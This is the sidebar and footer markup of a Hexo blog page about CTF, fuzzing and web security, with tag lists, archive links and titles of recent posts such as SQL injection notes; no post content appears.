      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/learn/" rel="tag">learn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/security/" rel="tag">security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" rel="tag">论文细读</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/Fuzzing/" style="font-size: 17.5px;">Fuzzing</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 15px;">Web安全</a> <a href="/tags/learn/" style="font-size: 12.5px;">learn</a> <a href="/tags/security/" style="font-size: 10px;">security</a> <a href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" style="font-size: 20px;">论文细读</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/02/03/Paper-Code%20Vulnerability%20Detection%20via%20Signal-Aware%20AI/">RESOLVERFUZZ</a>
          </li>
        
          <li>
            <a href="/2024/02/01/Web-SQLi1/">SQLi1</a>
          </li>
        
          <li>
            <a href="/2024/02/01/Web-SQLi2/">SQLi2</a>
          </li>
        
          <li>
            <a href="/2024/01/31/20240131/">20240131</a>
          </li>
        
          <li>
            <a href="/2024/01/31/Web-Basic/">Web-Basic</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>